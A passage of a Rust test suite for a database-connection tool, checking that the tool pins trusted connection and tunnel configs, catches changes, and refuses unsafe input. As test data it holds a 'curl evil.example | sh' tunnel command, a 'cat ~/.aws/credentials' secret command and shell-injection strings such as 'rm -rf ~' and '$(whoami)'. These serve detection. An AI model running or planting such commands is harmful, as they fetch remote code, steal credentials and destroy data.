        fx.repo().join(".spelaion/connections/local.toml"),
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"x.db\"\nsqlite3 = \"sqlite3\"\n",
    )
    .unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let problems = format!("{:?}", config.problems);
    assert!(problems.contains("DuckDB is a local file"), "{problems}");
    assert!(problems.contains("sqlite3 only applies"), "{problems}");
    assert!(!problems.contains("remote.toml"), "{problems}");

    let backend = FakeBackend::default();
    let id = ConnectionId {
        source: Source::Workspace,
        path: "remote".into(),
    };
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve(&id)
        .unwrap();
    // Not resolved against the repository: it is a path on the server.
    assert_eq!(resolved.params.database, "data/app.db");
    assert_eq!(resolved.sqlite3.as_deref(), Some("/opt/sqlite/bin/sqlite3"));
    assert_eq!(resolved.tunnel.unwrap().hops[0].host, "files.internal");
}

const PINNED_DB: &str = "schema_version = 1\nname = \"Orders\"\nengine = \"postgres\"\nhost = \"db.internal\"\ndatabase = \"orders\"\nuser = \"app\"\npassword = { secret = \"keychain\" }\ntunnel = \"bastion\"\n";
const PINNED_TUNNEL: &str = "schema_version = 1\n\n[[hops]]\nhost = \"bastion.internal\"\nuser = \"ops\"\nauth = [\"agent\"]\n";

#[test]
fn reviewed_changes_must_still_match_the_workspace_and_revision() {
    let fx = Fixture::new("reviewed-revision");
    let path = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    let mut trust = fx.trusted();
    std::fs::write(&path, PINNED_DB.replace("db.internal", "first.example")).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let reviewed = trust.changes(&config).remove(0);
    std::fs::write(&path, PINNED_DB.replace("db.internal", "second.example")).unwrap();
    let changed_config = load(Some(&fx.repo()), &fx.user());
    assert!(
        trust
            .accept_reviewed(&changed_config, &fx.repo(), &reviewed)
            .is_err()
    );
    assert!(
        trust
            .accept_reviewed(&config, &fx.user(), &reviewed)
            .is_err()
    );
    trust
        .accept_reviewed(&config, &fx.repo(), &reviewed)
        .unwrap();
    assert!(
        trust
            .accept_reviewed(&config, &fx.repo(), &reviewed)
            .is_err()
    );
    assert!(
        trust
            .changes(&changed_config)
            .iter()
            .any(|c| c.item == reviewed.item)
    );
}

#[test]
fn stale_connection_and_tunnel_edits_reject_unseen_file_changes() {
    let fx = Fixture::new("stale-form-files");
    let connection_path = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    let tunnel_path = fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let config = load(Some(&fx.repo()), &fx.user());
    let mut connection = ConnectionDraft::from_entry(config.connection(&ws("orders")).unwrap());
    connection.name = "Renamed".into();
    let entry = config.tunnels.iter().find(|t| t.name == "bastion").unwrap();
    let mut tunnel = TunnelDraft::from_entry(entry);
    tunnel.hops[0].user = "other".into();
    let backend = FakeBackend::default();

    std::fs::write(
        &connection_path,
        format!("{PINNED_DB}\n[mcp]\nmax_rows = 7\n"),
    )
    .unwrap();
    assert!(
        spelaion_config::update_connection(&config, &ws("orders"), &connection, None, &backend)
            .is_err()
    );
    assert!(
        std::fs::read_to_string(&connection_path)
            .unwrap()
            .contains("max_rows = 7")
    );
    std::fs::write(
        &tunnel_path,
        format!("{PINNED_TUNNEL}command = \"malicious\"\n"),
    )
    .unwrap();
    assert!(
        update_tunnel(
            &config,
            Source::Workspace,
            "bastion",
            &tunnel,
            &[],
            &backend
        )
        .is_err()
    );
    assert!(
        std::fs::read_to_string(&tunnel_path)
            .unwrap()
            .contains("malicious")
    );

    std::fs::write(&connection_path, PINNED_DB).unwrap();
    std::fs::write(&tunnel_path, PINNED_TUNNEL).unwrap();
    let written =
        spelaion_config::update_connection(&config, &ws("orders"), &connection, None, &backend)
            .unwrap();
    assert_eq!(written.name.as_deref(), Some("Renamed"));
    let written = update_tunnel(
        &config,
        Source::Workspace,
        "bastion",
        &tunnel,
        &[],
        &backend,
    )
    .unwrap();
    assert_eq!(written.hops[0].user, "other");
}

#[test]
fn only_the_exact_written_revision_is_pinned() {
    let fx = Fixture::new("own-written-revision");
    let path = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    let tunnel_path = fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let mut trust = fx.trusted();
    let config = load(Some(&fx.repo()), &fx.user());
    let connection = config.connection(&ws("orders")).unwrap().file.clone();
    let tunnel = config
        .tunnels
        .iter()
        .find(|t| t.name == "bastion")
        .unwrap()
        .file
        .clone();
    std::fs::write(&path, PINNED_DB.replace("db.internal", "evil.example")).unwrap();
    std::fs::write(
        &tunnel_path,
        format!("{PINNED_TUNNEL}command = \"malicious\"\n"),
    )
    .unwrap();
    trust
        .accept_connection_write(&config, &ws("orders"), &connection)
        .unwrap();
    trust
        .accept_tunnel_write(&config, "bastion", &tunnel)
        .unwrap();
    let changes = trust.changes(&load(Some(&fx.repo()), &fx.user()));
    assert!(changes.iter().any(|c| c.item == "connection:orders"));
    assert!(changes.iter().any(|c| c.item == "tunnel:bastion"));
}

#[test]
fn stale_reviews_of_tunnels_and_server_keys_are_rejected() {
    let fx = Fixture::new("review-tunnel-keys");
    let tunnel = fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let hosts = fx.write("repo/.spelaion/known_hosts", "server ssh-ed25519 key-one\n");
    let mut trust = fx.trusted();
    std::fs::write(
        &tunnel,
        PINNED_TUNNEL.replace("bastion.internal", "first.example"),
    )
    .unwrap();
    std::fs::write(&hosts, "server ssh-ed25519 key-two\n").unwrap();
    let first = load(Some(&fx.repo()), &fx.user());
    let changes = trust.changes(&first);
    let reviewed_tunnel = changes
        .iter()
        .find(|c| c.item == "tunnel:bastion")
        .unwrap()
        .clone();
    let reviewed_hosts = changes
        .iter()
        .find(|c| c.item == "known_hosts")
        .unwrap()
        .clone();
    std::fs::write(
        &tunnel,
        PINNED_TUNNEL.replace("bastion.internal", "second.example"),
    )
    .unwrap();
    std::fs::write(&hosts, "server ssh-ed25519 key-three\n").unwrap();
    let latest = load(Some(&fx.repo()), &fx.user());
    assert!(
        trust
            .accept_reviewed(&latest, &fx.repo(), &reviewed_tunnel)
            .is_err()
    );
    assert!(
        trust
            .accept_reviewed(&latest, &fx.repo(), &reviewed_hosts)
            .is_err()
    );
    assert_eq!(trust.changes(&latest).len(), 2);
}

#[test]
fn stale_initial_trust_prompt_does_not_accept_later_changes() {
    let fx = Fixture::new("stale-trust-prompt");
    let path = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    let mut trust = fx.trusted();
    std::fs::write(&path, PINNED_DB.replace("db.internal", "evil.example")).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    trust.trust_if_untrusted(&config).unwrap();
    assert_eq!(trust.changes(&config).len(), 1);
}

#[test]
fn edited_unreviewed_items_do_not_approve_unrelated_changes() {
    let fx = Fixture::new("edit-unreviewed");
    let connection = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    let tunnel = fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let mut trust = fx.trusted();
    std::fs::write(
        &connection,
        PINNED_DB.replace("db.internal", "evil.example"),
    )
    .unwrap();
    std::fs::write(&tunnel, format!("{PINNED_TUNNEL}command = \"malicious\"\n")).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let mut draft = ConnectionDraft::from_entry(config.connection(&ws("orders")).unwrap());
    draft.name = "Edited".into();
    let entry = config.tunnels.iter().find(|t| t.name == "bastion").unwrap();
    let mut tunnel_draft = TunnelDraft::from_entry(entry);
    tunnel_draft.hops[0].user = "edited".into();
    let backend = FakeBackend::default();
    let conn_rev =
        spelaion_config::connection_revision(config.connection(&ws("orders")).unwrap()).unwrap();
    let tunnel_rev = spelaion_config::tunnel_revision(entry).unwrap();
    let written = spelaion_config::update_connection_at_revision(
        &config,
        &ws("orders"),
        &draft,
        None,
        &backend,
        &conn_rev,
    )
    .unwrap();
    trust
        .accept_connection_edit(&config, &ws("orders"), &written)
        .unwrap();
    let written = spelaion_config::update_tunnel_at_revision(
        &config,
        Source::Workspace,
        "bastion",
        &tunnel_draft,
        &[],
        &backend,
        &tunnel_rev,
    )
    .unwrap();
    trust
        .accept_tunnel_edit(&config, "bastion", &written)
        .unwrap();
    let latest = load(Some(&fx.repo()), &fx.user());
    assert_eq!(trust.changes(&latest).len(), 2);
    assert!(
        spelaion_config::update_connection_at_revision(
            &latest,
            &ws("orders"),
            &draft,
            None,
            &backend,
            &conn_rev
        )
        .is_err()
    );
    assert!(
        spelaion_config::update_tunnel_at_revision(
            &latest,
            Source::Workspace,
            "bastion",
            &tunnel_draft,
            &[],
            &backend,
            &tunnel_rev
        )
        .is_err()
    );
}

#[test]
fn edited_trusted_items_record_only_the_written_revision() {
    let fx = Fixture::new("edit-trusted");
    fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let mut trust = fx.trusted();
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.connection(&ws("orders")).unwrap();
    let mut draft = ConnectionDraft::from_entry(entry);
    draft.host = "approved.example".into();
    let backend = FakeBackend::default();
    let revision = spelaion_config::connection_revision(entry).unwrap();
    let written = spelaion_config::update_connection_at_revision(
        &config,
        &ws("orders"),
        &draft,
        None,
        &backend,
        &revision,
    )
    .unwrap();
    trust
        .accept_connection_edit(&config, &ws("orders"), &written)
        .unwrap();
    resolved(&fx, &trust).unwrap();
    let entry = config.tunnels.iter().find(|t| t.name == "bastion").unwrap();
    let mut draft = TunnelDraft::from_entry(entry);
    draft.hops[0].host = "approved-bastion.example".into();
    let revision = spelaion_config::tunnel_revision(entry).unwrap();
    let written = spelaion_config::update_tunnel_at_revision(
        &config,
        Source::Workspace,
        "bastion",
        &draft,
        &[],
        &backend,
        &revision,
    )
    .unwrap();
    trust
        .accept_tunnel_edit(&config, "bastion", &written)
        .unwrap();
    resolved(&fx, &trust).unwrap();
}

fn resolved(fx: &Fixture, trust: &TrustStore) -> Result<(), ResolveError> {
    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    Resolver::new(&config, trust, &FakeBackend::default())
        .resolve(&ws("orders"))
        .map(|_| ())
}

fn changed(result: Result<(), ResolveError>) -> spelaion_config::ItemChange {
    match result {
        Err(ResolveError::Changed { change, .. }) => change,
        other => panic!("expected a change to review: {other:?}"),
    }
}

#[test]
fn a_pull_that_changes_a_trusted_connection_is_asked_about_again() {
    let fx = Fixture::new("pinned-change");
    let path = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let mut trust = fx.trusted();
    resolved(&fx, &trust).unwrap();

    // Comments, formatting and the display name are not changes.
    std::fs::write(
        &path,
        format!(
            "# reviewed by the team\n{}",
            PINNED_DB.replace("name = \"Orders\"", "name   =   \"Orders (EU)\"")
        ),
    )
    .unwrap();
    resolved(&fx, &trust).unwrap();

    // The server changes: nothing is resolved, and the change says what and how.
    std::fs::write(&path, PINNED_DB.replace("db.internal", "attacker.example")).unwrap();
    let change = changed(resolved(&fx, &trust));
    assert_eq!(change.item, "connection:orders");
    assert!(!change.new);
    assert_eq!(
        change.fields,
        [spelaion_config::FieldChange {
            field: "host".into(),
            before: Some("db.internal".into()),
            after: Some("attacker.example".into()),
        }]
    );
    let message = ResolveError::Changed {
        root: fx.repo(),
        change: change.clone(),
    }
    .to_string();
    assert!(
        message.contains("host db.internal → attacker.example"),
        "{message}"
    );
    // Reloading the trust from disk does not forget the snapshot.
    let reloaded = TrustStore::load(&fx.user()).unwrap();
    changed(resolved(&fx, &reloaded));

    // Accepting records only that item.
    let config = load(Some(&fx.repo()), &fx.user());
    trust.accept(&config, &change.item).unwrap();
    resolved(&fx, &trust).unwrap();
    resolved(&fx, &TrustStore::load(&fx.user()).unwrap()).unwrap();
}

#[test]
fn every_way_around_the_snapshot_is_caught() {
    let fx = Fixture::new("pinned-ways");
    let path = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    let tunnel = fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let trust = fx.trusted();
    for (field, edited) in [
        (
            "password.secret",
            PINNED_DB.replace("\"keychain\"", "\"env:AWS_SECRET_ACCESS_KEY\""),
        ),
        ("port", format!("{PINNED_DB}port = 15432\n")),
        ("tunnel", PINNED_DB.replace("tunnel = \"bastion\"\n", "")),
        (
            "tls.mode",
            format!("{PINNED_DB}\n[tls]\nmode = \"disable\"\n"),
        ),
        (
            "user",
            PINNED_DB.replace("user = \"app\"", "user = \"${env:AWS_SECRET_ACCESS_KEY}\""),
        ),
        (
            "mcp.writes",
            format!("{PINNED_DB}\n[mcp]\nexposed = true\nwrites = \"allow\"\n"),
        ),
        (
            "local_port",
            PINNED_DB.replace(
                "tunnel = \"bastion\"\n",
                "tunnel = \"bastion\"\nlocal_port = 5433\n",
            ),
        ),
    ] {
        std::fs::write(&path, &edited).unwrap();
        let change = changed(resolved(&fx, &trust));
        assert!(
            change.fields.iter().any(|f| f.field == field),
            "{field}: {change:?}"
        );
    }
    std::fs::write(&path, PINNED_DB).unwrap();
    resolved(&fx, &trust).unwrap();

    // The tunnel the connection goes through is checked too.
    std::fs::write(
        &tunnel,
        PINNED_TUNNEL.replace("bastion.internal", "evil.example"),
    )
    .unwrap();
    let change = changed(resolved(&fx, &trust));
    assert_eq!(change.item, "tunnel:bastion");
    assert_eq!(change.fields[0].field, "hops.0.host");
    std::fs::write(
        &tunnel,
        format!("{PINNED_TUNNEL}command = \"curl evil.example | sh\"\n"),
    )
    .unwrap();
    assert_eq!(changed(resolved(&fx, &trust)).item, "tunnel:bastion");
    // Its network settings too: they are part of what the user trusted.
    std::fs::write(
        &tunnel,
        PINNED_TUNNEL.replace(
            "schema_version = 1\n",
            "schema_version = 1\nkeepalive_interval = 0\n",
        ),
    )
    .unwrap();
    let change = changed(resolved(&fx, &trust));
    assert_eq!(change.item, "tunnel:bastion");
    assert_eq!(change.fields[0].field, "keepalive_interval");
    std::fs::write(&tunnel, PINNED_TUNNEL).unwrap();
    resolved(&fx, &trust).unwrap();

    // A connection added after trusting is new: nothing of it is resolved either.
    fx.write(
        "repo/.spelaion/connections/new.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"x\"\ndatabase = \"d\"\nuser = \"u\"\npassword = { secret = \"cmd:cat ~/.aws/credentials\" }\n",
    );
    let config = load(Some(&fx.repo()), &fx.user());
    match Resolver::new(&config, &trust, &FakeBackend::default()).resolve(&ws("new")) {
        Err(ResolveError::Changed { change, .. }) => {
            assert!(change.new);
            assert!(change.to_string().contains("is new in the repository"));
        }
        other => panic!("{other:?}"),
    }
    assert_eq!(trust.changes(&config).len(), 1);
}

#[test]
fn drafts_are_the_users_but_the_tunnels_they_use_are_checked() {
    let fx = Fixture::new("pinned-draft");
    fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    let tunnel = fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let trust = fx.trusted();
    let backend = FakeBackend::default();
    let config = load(Some(&fx.repo()), &fx.user());
    let draft = ConnectionDraft {
        host: "typed-by-the-user".into(),
        ..ConnectionDraft::from_entry(config.connection(&ws("orders")).unwrap())
    };
    let resolver = Resolver::new(&config, &trust, &backend);
    resolver.resolve_edit(&ws("orders"), &draft).unwrap();
    resolver
        .resolve_draft(&ConnectionDraft {
            name: "Copy".into(),
            ..draft.clone()
        })
        .unwrap();

    std::fs::write(
        &tunnel,
        PINNED_TUNNEL.replace("bastion.internal", "evil.example"),
    )
    .unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let resolver = Resolver::new(&config, &trust, &backend);
    assert!(matches!(
        resolver.resolve_edit(&ws("orders"), &draft),
        Err(ResolveError::Changed { .. })
    ));
}

#[test]
fn editor_access_checks_saved_provenance_before_using_commands() {
    let fx = Fixture::new("editor-access");
    let file = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let backend = FakeBackend::default();
    let config = load(Some(&fx.repo()), &fx.user());
    let untrusted = TrustStore::load(&fx.user()).unwrap();
    let r = Resolver::new(&config, &untrusted, &backend);
    assert!(matches!(
        r.check_editor_access(Source::User, Some(&ws("orders"))),
        Err(ResolveError::Untrusted { .. })
    ));
    assert!(matches!(
        r.check_editor_access(Source::Workspace, None),
        Err(ResolveError::Untrusted { .. })
    ));
    r.check_editor_access(Source::User, None).unwrap();

    let trust = fx.trusted();
    let r = Resolver::new(&config, &trust, &backend);
    r.check_editor_access(Source::Workspace, None).unwrap();
    r.check_editor_access(Source::User, Some(&ws("orders")))
        .unwrap();
    let draft = ConnectionDraft::from_entry(config.connection(&ws("orders")).unwrap());
    r.resolve_edit(&ws("orders"), &draft).unwrap();

    std::fs::write(&file, PINNED_DB.replace("db.internal", "attacker.example")).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let r = Resolver::new(&config, &trust, &backend);
    assert!(matches!(
        r.check_editor_access(Source::User, Some(&ws("orders"))),
        Err(ResolveError::Changed { .. })
    ));
    assert!(matches!(
        r.resolve_edit(&ws("orders"), &draft),
        Err(ResolveError::Changed { .. })
    ));
    assert!(
        r.check_editor_access(Source::Workspace, Some(&ws("missing")))
            .is_err()
    );
    fx.write("repo/.spelaion/connections/new.toml", PINNED_DB);
    fx.write("user/connections/local.toml", PINNED_DB);
    let config = load(Some(&fx.repo()), &fx.user());
    let r = Resolver::new(&config, &trust, &backend);
    assert!(matches!(
        r.check_editor_access(Source::User, Some(&ws("new"))),
        Err(ResolveError::Changed { .. })
    ));
    let personal = ConnectionId {
        source: Source::User,
        path: "local".into(),
    };
    r.check_editor_access(Source::Workspace, Some(&personal))
        .unwrap();
    let no_workspace = load(None, &fx.user());
    let r = Resolver::new(&no_workspace, &trust, &backend);
    assert!(r.check_editor_access(Source::Workspace, None).is_err());
    r.check_editor_access(Source::User, Some(&personal))
        .unwrap();
}

#[test]
fn repositories_trusted_before_snapshots_are_adopted_as_they_are() {
    let fx = Fixture::new("pinned-legacy");
    let path = fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    // A trust file written before ADR-022: trusted by path only.
    let root = std::fs::canonicalize(fx.repo()).unwrap();
    std::fs::write(
        fx.user().join("trusted-workspaces.toml"),
        toml::to_string(&toml::Table::from_iter([(
            "trusted".to_string(),
            toml::Value::Array(vec![root.display().to_string().into()]),
        )]))
        .unwrap(),
    )
    .unwrap();
    let mut trust = TrustStore::load(&fx.user()).unwrap();
    assert!(trust.is_trusted(&fx.repo()));
    resolved(&fx, &trust).unwrap();

    let config = load(Some(&fx.repo()), &fx.user());
    assert!(trust.adopt(&config).unwrap());
    assert!(!trust.adopt(&config).unwrap());
    std::fs::write(&path, PINNED_DB.replace("db.internal", "attacker.example")).unwrap();
    changed(resolved(&fx, &TrustStore::load(&fx.user()).unwrap()));

    // Trusting again accepts the change, and says which.
    let config = load(Some(&fx.repo()), &fx.user());
    let accepted = trust.trust(&config).unwrap();
    assert_eq!(accepted.len(), 1);
    assert_eq!(accepted[0].item, "connection:orders");
    resolved(&fx, &trust).unwrap();

    // Revoking forgets the snapshots: trusting later starts again from what is there.
    trust.revoke(&fx.repo()).unwrap();
    assert!(matches!(
        resolved(&fx, &trust),
        Err(ResolveError::Untrusted { .. })
    ));
}

const TEAM_HOSTS: &str = "# Reviewed by the team\nbastion.internal ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0Cx5aAdFPmIIPx6ZxdIYFKbARZbBbB5NV0QIO3Qdp2\n";

#[test]
fn the_teams_known_hosts_is_used_only_as_trusted() {
    let fx = Fixture::new("team-hosts");
    fx.write("repo/.spelaion/connections/orders.toml", PINNED_DB);
    fx.write("repo/.spelaion/tunnels/bastion.toml", PINNED_TUNNEL);
    let hosts = fx.write("repo/.spelaion/known_hosts", TEAM_HOSTS);
    let backend = FakeBackend::default();

    // Untrusted repository: nothing of it is used (its connections do not even resolve).
    let config = load(Some(&fx.repo()), &fx.user());
    let untrusted = TrustStore::load(&fx.user()).unwrap();
    assert!(matches!(
        Resolver::new(&config, &untrusted, &backend).resolve(&ws("orders")),
        Err(ResolveError::Untrusted { .. })
    ));

    // Trusted: the tunnel carries the team's file.
    let trust = fx.trusted();
    let known = |trust: &TrustStore| {
        let config = load(Some(&fx.repo()), &fx.user());
        Resolver::new(&config, trust, &backend)
            .resolve(&ws("orders"))
            .map(|r| r.tunnel.unwrap().known_hosts)
    };
    assert_eq!(known(&trust).unwrap(), Some(hosts.clone()));

    // Comments and blank lines are not changes.
    std::fs::write(&hosts, format!("{TEAM_HOSTS}\n# another comment\n")).unwrap();
    assert_eq!(known(&trust).unwrap(), Some(hosts.clone()));

    // Another key for the bastion: the connection waits for a review, and says what changed.
    std::fs::write(&hosts, TEAM_HOSTS.replace("Qdp2", "XXXX")).unwrap();
    let change = changed(known(&trust).map(|_| ()));
    assert_eq!(change.item, spelaion_config::KNOWN_HOSTS_ITEM);
    assert_eq!(change.fields[0].field, "bastion.internal ssh-ed25519");
    assert!(
        change
            .to_string()
            .contains("the file .spelaion/known_hosts changed"),
        "{change}"
    );
    // Testing a tunnel from its editor leaves the unreviewed file out instead.
    let config = load(Some(&fx.repo()), &fx.user());
    let draft = spelaion_config::TunnelDraft::from_entry(
        config
            .tunnel_for(Source::Workspace, "bastion")
            .expect("the tunnel"),
    );
    let tested = Resolver::new(&config, &trust, &backend)
        .resolve_tunnel_draft(&draft)
        .unwrap();
    assert_eq!(tested.known_hosts, None);

    // Accepting it records it; then it is used again.
    let mut trust = trust;
    trust
        .accept(&config, spelaion_config::KNOWN_HOSTS_ITEM)
        .unwrap();
    assert_eq!(known(&trust).unwrap(), Some(hosts.clone()));

    // Added after trusting: new, so reviewed before it is used.
    std::fs::remove_file(&hosts).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    trust
        .accept(&config, spelaion_config::KNOWN_HOSTS_ITEM)
        .unwrap();
    assert_eq!(known(&trust).unwrap(), None);
    std::fs::write(&hosts, TEAM_HOSTS).unwrap();
    assert!(changed(known(&trust).map(|_| ())).new);
}

#[test]
fn client_certificates_come_in_pairs_and_keys_stay_out_of_the_repository() {
    let fx = Fixture::new("client-cert");
    let base = "schema_version = 1\nengine = \"postgres\"\nhost = \"db\"\ndatabase = \"d\"\nuser = \"ops\"\n";
    fx.write(
        "repo/.spelaion/connections/alone.toml",
        &format!("{base}\n[tls]\ncert = \"certs/ops.crt\"\n"),
    );
    fx.write(
        "repo/.spelaion/connections/mssql.toml",
        "schema_version = 1\nengine = \"sqlserver\"\nhost = \"db\"\nuser = \"ops\"\n\n[tls]\ncert = \"a.crt\"\nkey = \"~/a.key\"\n",
    );
    fx.write(
        "repo/.spelaion/connections/leaked.toml",
        &format!("{base}\n[tls]\ncert = \"certs/ops.crt\"\nkey = \"certs/ops.key\"\n"),
    );
    fx.write("repo/.spelaion/connections/good.toml", &format!("{base}\n[tls]\nmode = \"verify-full\"\ncert = \"certs/ops.crt\"\nkey = \"~/.spelaion-test/ops.key\"\n"));
    let config = load(Some(&fx.repo()), &fx.user());
    let problems: Vec<String> = config.problems.iter().map(|p| p.to_string()).collect();
    assert!(
        problems
            .iter()
            .any(|p| p.contains("alone.toml") && p.contains("go together")),
        "{problems:?}"
    );
    assert!(
        problems
            .iter()
            .any(|p| p.contains("mssql.toml") && p.contains("SQL Server does not")),
        "{problems:?}"
    );

    let trust = fx.trusted();
    let backend = FakeBackend::default();
    let resolver = Resolver::new(&config, &trust, &backend);
    match resolver.resolve(&ws("leaked")) {
        Err(ResolveError::Config(e)) => {
            assert!(e.to_string().contains("inside the repository"), "{e}")
        }
        other => panic!(
            "a key in the repository must be refused: {:?}",
            other.map(|_| ())
        ),
    }
    let good = resolver.resolve(&ws("good")).unwrap();
    assert_eq!(
        good.params.client_certificate,
        Some(fx.repo().join("certs/ops.crt"))
    );
    let key = good.params.client_key.unwrap();
    assert!(
        key.ends_with(".spelaion-test/ops.key") && !key.starts_with(fx.repo()),
        "{key:?}"
    );

    // The form keeps a repository key absolute (so it is refused, not shared) and writes a
    // key in the home directory as `~/…`.
    let draft = |key: String| ConnectionDraft {
        tls_cert: fx.repo().join("certs/ops.crt").display().to_string(),
        tls_key: key,
        ..postgres_draft()
    };
    let file = draft(fx.repo().join("certs/ops.key").display().to_string())
        .to_file(&config)
        .unwrap();
    assert_eq!(file.tls.cert.as_deref(), Some("certs/ops.crt"));
    assert!(Path::new(file.tls.key.as_deref().unwrap()).is_absolute());
    let home = std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" }).unwrap();
    let in_home = Path::new(&home)
        .join(".ssl")
        .join("ops.key")
        .display()
        .to_string();
    let file = draft(in_home).to_file(&config).unwrap();
    assert_eq!(file.tls.key.as_deref(), Some("~/.ssl/ops.key"));
}

#[test]
fn cloud_tokens_write_a_safe_command_and_come_back_to_the_form() {
    use spelaion_config::CloudToken;
    let fx = Fixture::new("cloud-token");
    let config = load(Some(&fx.repo()), &fx.user());
    let draft = |token: CloudToken, host: &str, user: &str| ConnectionDraft {
        host: host.into(),
        user: user.into(),
        port: None,
        password: PasswordChoice::CloudToken(token),
        ..postgres_draft()
    };
    let secret = |d: ConnectionDraft| d.to_file(&config).map(|f| f.password.unwrap().secret);

    assert_eq!(
        secret(draft(
            CloudToken::AwsRds,
            "orders.c9akciq32.eu-west-1.rds.amazonaws.com",
            "ops_iam"
        ))
        .unwrap(),
        "cmd:aws rds generate-db-auth-token --hostname orders.c9akciq32.eu-west-1.rds.amazonaws.com --port 5432 --username ops_iam --region eu-west-1"
    );
    // Not an RDS name: the CLI's default region.
    assert_eq!(
        secret(draft(CloudToken::AwsRds, "db.internal", "ops")).unwrap(),
        "cmd:aws rds generate-db-auth-token --hostname db.internal --port 5432 --username ops"
    );
    assert!(
        secret(draft(
            CloudToken::AzureAd,
            "x.postgres.database.azure.com",
            "ops@contoso.com"
        ))
        .unwrap()
        .starts_with("cmd:az account get-access-token")
    );
    assert_eq!(
        secret(draft(
            CloudToken::GoogleCloudSql,
            "10.0.0.3",
            "ops@example.iam"
        ))
        .unwrap(),
        "cmd:gcloud sql generate-login-token"
    );

    // Nothing that a shell would read as more than a name gets into the command.
    for (host, user) in [
        ("db; rm -rf ~", "ops"),
        ("db", "ops && curl evil.example | sh"),
        ("db", "$(whoami)"),
        ("db`id`", "ops"),
        ("", "ops"),
    ] {
        let err = secret(draft(CloudToken::AwsRds, host, user)).unwrap_err();
        assert!(
            err.to_string().contains("can only contain"),
            "{host} {user}: {err}"
        );
    }
    let sqlserver = ConnectionDraft {
        engine: Engine::Sqlserver,
        ..draft(CloudToken::AzureAd, "db", "ops")
    };
    assert!(
        secret(sqlserver)
            .unwrap_err()
            .to_string()
            .contains("not sqlserver")
    );

    // Saved and opened again, the form shows the token, not a raw command; a hand-written
    // command stays a command.
    let token = draft(
        CloudToken::AwsRds,
        "orders.c9akciq32.eu-west-1.rds.amazonaws.com",
        "ops_iam",
    );
    let id = add_connection(&config, &token, None, &FakeBackend::default()).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    assert_eq!(
        ConnectionDraft::from_entry(config.connection(&id).unwrap()).password,
        PasswordChoice::CloudToken(CloudToken::AwsRds)
    );
    let handmade = ConnectionDraft {
        name: "Handmade".into(),
        password: PasswordChoice::Other(
            "cmd:aws rds generate-db-auth-token --hostname other".into(),
        ),
        ..token.clone()
    };
    let id = add_connection(&config, &handmade, None, &FakeBackend::default()).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    assert!(matches!(
        ConnectionDraft::from_entry(config.connection(&id).unwrap()).password,
        PasswordChoice::Other(_)
    ));
}

#[test]
fn every_missing_personal_variable_is_reported_at_once_and_saved_in_place() {
    let fx = Fixture::new("user-vars");
    fx.write(
        "repo/.spelaion/connections/orders.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"db.internal\"\ndatabase = \"orders\"\nuser = \"${user.db_user}\"\npassword = { secret = \"keychain\" }\ntunnel = \"bastion\"\n\n[tls]\nmode = \"verify-full\"\ncert = \"certs/${user.db_user}.crt\"\nkey = \"~/.ssl/${user.db_user}.key\"\n",
    );
    fx.write(
        "repo/.spelaion/tunnels/bastion.toml",
        "schema_version = 1\n\n[[hops]]\nhost = \"bastion.internal\"\nuser = \"${user.ssh_user}\"\nauth = [\"agent\"]\n",
    );
    let user_toml = fx.write(
        "user/user.toml",
        "# My personal settings\nschema_version = 1\n\n[vars]\nteam = \"dba\" # kept\n",
    );
    let trust = fx.trusted();
    let backend = FakeBackend::default();
    let resolve = || {
        let config = load(Some(&fx.repo()), &fx.user());
        Resolver::new(&config, &trust, &backend)
            .resolve(&ws("orders"))
            .map(|_| ())
    };

    // Both variables, the tunnel's too, once each, before anything is resolved.
    match resolve() {
        Err(ResolveError::MissingVariables { names }) => {
            assert_eq!(names, ["db_user", "ssh_user"]);
            let message = ResolveError::MissingVariables { names }.to_string();
            assert!(
                message.contains("${user.db_user}, ${user.ssh_user}")
                    && message.contains("user.toml"),
                "{message}"
            );
        }
        other => panic!("{:?}", other.map(|_| ())),
    }
    assert!(
        backend.keychain.lock().unwrap().is_empty(),
        "nothing was read"
    );

    spelaion_config::set_user_vars(
        &fx.user(),
        &BTreeMap::from([("db_user".to_string(), " ana ".to_string())]),
    )
    .unwrap();
    match resolve() {
        Err(ResolveError::MissingVariables { names }) => assert_eq!(names, ["ssh_user"]),
